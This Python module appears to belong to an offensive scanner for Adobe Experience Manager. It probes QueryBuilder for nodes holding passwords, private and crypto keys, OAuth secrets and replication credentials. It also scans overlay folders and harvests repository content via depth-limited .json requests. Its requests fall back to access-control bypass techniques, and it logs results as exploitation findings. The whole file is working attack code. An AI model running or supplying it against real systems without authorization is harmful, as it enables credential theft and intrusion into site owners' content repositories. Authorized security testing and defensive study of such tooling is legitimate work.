"""JCR Property & Node Inference Engine.

Performs:
- Property guessing via QueryBuilder filtering on hidden properties
  (jcr:data, jcr:password, rep:password, sling:resourceType, cq:password)
- Virtual folder scanning (/mnt/overlay, /mnt/override, /libs/granite/*)
- Incremental infinity.json depth control to harvest data without DoSing
"""

import asyncio
import json
from typing import List, Dict, Set, Optional

from core.models import Finding, VulnSeverity, ScanPhase, BypassTechnique
from core.config import AEMConfig
from core.engine import HTTPXEngine
from bypass.transformers import BypassTransformer


class JCRInferenceEngine:
    """JCR property guessing, virtual folder scanning, and safe depth probing."""
    
    def _get_bypass_enum(self, response) -> Optional[BypassTechnique]:
        """Convert response bypass string to BypassTechnique enum."""
        if response.bypass_used:
            try:
                return BypassTechnique(response.bypass_used)
            except ValueError:
                pass
        return None
    
    # Properties to probe via QueryBuilder
    SENSITIVE_PROPERTIES: List[str] = [
        "jcr:data",
        "jcr:password",
        "rep:password",
        "rep:authorizableId",
        "rep:principalName",
        "rep:members",
        "sling:resourceType",
        "sling:vanityPath",
        "sling:redirect",
        "cq:password",
        "cq:cryptoKey",
        "cq:privKey",
        "cq:pubKey",
        "cq:clientlib",
        "granite:loginPath",
        "oauth.token",
        "oauth.secret",
        "transportUri",
        "transportUser",
        "transportPassword",
    ]
    
    # QueryBuilder query templates for property inference
    QUERYBUILDER_TEMPLATES: List[Dict[str, str]] = [
        # Search nodes with specific property
        {
            "path": "/",
            "property": "{prop}",
            "property.operation": "exists",
            "p.limit": "10",
            "p.hits": "full",
        },
        # Search by resource type
        {
            "path": "/content",
            "type": "nt:unstructured",
            "property": "{prop}",
            "property.operation": "exists",
            "p.limit": "5",
            "p.hits": "selective",
            "p.properties": "jcr:path {prop}",
        },
        # Deep search for password-like properties
        {
            "path": "/",
            "1_property": "{prop}",
            "1_property.operation": "exists",
            "type": "nt:unstructured",
            "p.limit": "20",
        },
    ]
    
    # Virtual / overlay folders that bypass standard protection
    VIRTUAL_FOLDERS: List[str] = [
        "/mnt/overlay",
        "/mnt/override",
        "/mnt/overlay/libs",
        "/mnt/overlay/apps",
        "/mnt/override/libs",
        "/mnt/override/apps",
        "/libs/granite/core/content",
        "/libs/granite/ui/content",
        "/libs/granite/security/content",
        "/libs/granite/operations/content",
        "/libs/granite/workflow/content",
        "/libs/cq/core/content",
        "/libs/cq/security/content",
        "/libs/cq/workflow/content",
        "/libs/cq/replication/content",
        "/libs/dam/gui/content",
        "/libs/wcm/core/content",
        "/libs/commerce/gui/content",
        "/libs/social/commons/content",
    ]
    
    # Incremental depth levels for safe infinity probing
    DEPTH_LEVELS: List[int] = [1, 2, 3, 4, 5]
    
    # Paths to test incremental depth on
    DEPTH_PROBE_PATHS: List[str] = [
        "/content", "/etc", "/var", "/home",
        "/etc/cloudservices", "/etc/replication",
        "/etc/workflow", "/var/audit",
        "/home/users", "/home/groups",
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer):
        self.engine = engine
        self.config = config
        self.bypass = bypass
    
    async def run(self, base_url: str) -> List[Finding]:
        """Run the full JCR inference engine."""
        findings: List[Finding] = []
        
        # Phase A: QueryBuilder property inference
        qb_findings = await self._querybuilder_property_inference(base_url)
        findings.extend(qb_findings)
        
        # Phase B: Virtual folder scanning
        vf_findings = await self._scan_virtual_folders(base_url)
        findings.extend(vf_findings)
        
        # Phase C: Incremental depth probing
        depth_findings = await self._incremental_depth_probe(base_url)
        findings.extend(depth_findings)
        
        return findings
    
    def _is_valid_querybuilder_response(self, text: str) -> bool:
        """Check if response is actual QueryBuilder API (not login page)."""
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                has_hits = "hits" in data and isinstance(data.get("hits"), list)
                has_total = "total" in data and isinstance(data.get("total"), int)
                has_results = "results" in data and isinstance(data.get("results"), int)
                
                if has_hits or has_total or has_results:
                    # Reject auth pages
                    text_lower = text.lower()
                    if any(x in text_lower for x in ["login", "password", "j_password"]):
                        return False
                    return True
        except json.JSONDecodeError:
            pass
        return False
    
    async def _querybuilder_property_inference(self, base_url: str) -> List[Finding]:
        """Probe for hidden JCR properties via QueryBuilder API."""
        findings = []
        
        # First check if QueryBuilder is accessible
        qb_url = f"{base_url}/bin/querybuilder.json"
        qb_response = await self.engine.get_with_bypass_fallback(
            qb_url, base_url, "/bin/querybuilder.json",
            bypass_transformer=self.bypass,
            max_bypass_attempts=15
        )
        
        if qb_response.status_code != 200 or qb_response.is_soft_404:
            # Try alternate endpoints
            alt_endpoints = [
                "/bin/querybuilder.json.servlet",
                "/bin/querybuilder.feed.json",
                "/bin/querybuilder.1.json",
            ]
            for alt in alt_endpoints:
                alt_url = f"{base_url}{alt}"
                qb_response = await self.engine.get(alt_url)
                if qb_response.status_code == 200 and not qb_response.is_soft_404 and self._is_valid_querybuilder_response(qb_response.text):
                    break
        
        qb_accessible = (qb_response.status_code == 200 and 
                         not qb_response.is_soft_404 and 
                         self._is_valid_querybuilder_response(qb_response.text))
        
        if not qb_accessible:
            return findings
        
        findings.append(Finding(
            phase=ScanPhase.DISCOVERY,
            technique="JCR Inference: QueryBuilder Access",
            url=qb_response.url or qb_url,
            severity=VulnSeverity.MEDIUM,
            title="QueryBuilder API Accessible",
            description="QueryBuilder JSON endpoint is reachable",
            evidence={"status": qb_response.status_code, "sample": qb_response.text[:200], "bypass_technique": qb_response.bypass_used},
            bypass_used=self._get_bypass_enum(qb_response),
            chainable=True
        ))
        
        # Probe each sensitive property
        for prop in self.SENSITIVE_PROPERTIES:
            for template in self.QUERYBUILDER_TEMPLATES[:2]:
                params = {}
                for k, v in template.items():
                    params[k] = v.replace("{prop}", prop)
                
                query_string = "&".join(f"{k}={v}" for k, v in params.items())
                probe_url = f"{base_url}/bin/querybuilder.json?{query_string}"
                
                response = await self.engine.get(probe_url)
                
                if response.status_code == 200 and not response.is_soft_404 and self._is_valid_querybuilder_response(response.text):
                    try:
                        data = json.loads(response.text)
                        hits = data.get("hits", [])
                        total = data.get("total", data.get("results", 0))
                        
                        if isinstance(total, (int, float)) and total > 0:
                            severity = VulnSeverity.CRITICAL if "password" in prop.lower() or "secret" in prop.lower() else VulnSeverity.HIGH
                            
                            findings.append(Finding(
                                phase=ScanPhase.EXPLOITATION,
                                technique="JCR Inference: Property Discovery",
                                url=probe_url,
                                severity=severity,
                                title=f"Hidden Property Found: {prop}",
                                description=(
                                    f"QueryBuilder reveals {total} nodes with "
                                    f"property '{prop}'"
                                ),
                                evidence={
                                    "property": prop,
                                    "total_matches": total,
                                    "sample_hits": hits[:5] if hits else [],
                                    "query": params,
                                },
                                chainable=True
                            ))
                            break
                    except (json.JSONDecodeError, KeyError):
                        pass
        
        return findings
    
    async def _scan_virtual_folders(self, base_url: str) -> List[Finding]:
        """Scan virtual Sling folders that may bypass standard protection."""
        findings = []
        
        selectors = [".1.json", ".tidy.json", ".infinity.json", ".json"]
        
        for folder in self.VIRTUAL_FOLDERS:
            for selector in selectors:
                url = f"{base_url}{folder}{selector}"
                
                response = await self.engine.get_with_bypass_fallback(
                    url, base_url, f"{folder}{selector}",
                    bypass_transformer=self.bypass,
                    max_bypass_attempts=10
                )
                
                if response.status_code == 200 and not response.is_soft_404 and self._has_jcr_content(response.text):
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="JCR Inference: Virtual Folder",
                        url=response.url or url,
                        severity=VulnSeverity.HIGH,
                        title=f"Virtual Folder Accessible: {folder}",
                        description=(
                            f"Virtual Sling folder {folder} exposes content via "
                            f"{selector}"
                        ),
                        evidence={
                            "folder": folder,
                            "selector": selector,
                            "response_size": len(response.text),
                            "sample": response.text[:500],
                            "bypass_technique": response.bypass_used,
                        },
                        bypass_used=self._get_bypass_enum(response),
                        chainable=True
                    ))
                    break  # Found working selector for this folder
        
        return findings
    
    async def _incremental_depth_probe(self, base_url: str) -> List[Finding]:
        """Probe infinity.json with incrementally increasing depth.
        
        Instead of requesting .infinity.json (which can time out on huge trees),
        we request increasing depth levels and stop when timeout is detected.
        """
        findings = []
        
        for path in self.DEPTH_PROBE_PATHS:
            max_successful_depth = 0
            accumulated_data: Dict = {}
            timed_out = False
            
            for depth in self.DEPTH_LEVELS:
                url = f"{base_url}{path}.{depth}.json"
                
                response = await self.engine.get_with_bypass_fallback(
                    url, base_url, f"{path}.{depth}.json",
                    bypass_transformer=self.bypass,
                    max_bypass_attempts=5
                )
                
                if response.status_code == 200 and not response.is_soft_404:
                    try:
                        data = json.loads(response.text)
                        if isinstance(data, dict):
                            max_successful_depth = depth
                            accumulated_data = data
                            
                            # Check response time — if approaching timeout, stop
                            if response.elapsed > (self.config.timeout * 0.7):
                                timed_out = True
                                break
                    except json.JSONDecodeError:
                        break
                elif response.status_code == 0:
                    # Connection error / timeout
                    timed_out = True
                    break
                else:
                    break
            
            if max_successful_depth > 0:
                node_keys = list(accumulated_data.keys()) if accumulated_data else []
                
                severity = VulnSeverity.MEDIUM
                if max_successful_depth >= 3:
                    severity = VulnSeverity.HIGH
                if any(sp in path for sp in ["/home/users", "/etc/replication", "/var/audit"]):
                    severity = VulnSeverity.HIGH
                
                findings.append(Finding(
                    phase=ScanPhase.DISCOVERY,
                    technique="JCR Inference: Incremental Depth",
                    url=f"{base_url}{path}.{max_successful_depth}.json",
                    severity=severity,
                    title=f"Depth Probe Success: {path} (depth={max_successful_depth})",
                    description=(
                        f"Incremental depth probing harvested data at depth "
                        f"{max_successful_depth} for {path}"
                        f"{' (timeout approaching — stopped)' if timed_out else ''}"
                    ),
                    evidence={
                        "path": path,
                        "max_depth_reached": max_successful_depth,
                        "timed_out": timed_out,
                        "top_level_keys": node_keys[:30],
                        "key_count": len(node_keys),
                    },
                    chainable=True
                ))
        
        return findings
    
    def _has_jcr_content(self, text: str) -> bool:
        """Check if response contains JCR/Sling content."""
        if len(text) < 10:
            return False
        indicators = [
            "jcr:primaryType", "sling:resourceType", "cq:",
            "nt:unstructured", "nt:folder", "rep:",
        ]
        return any(ind in text for ind in indicators)
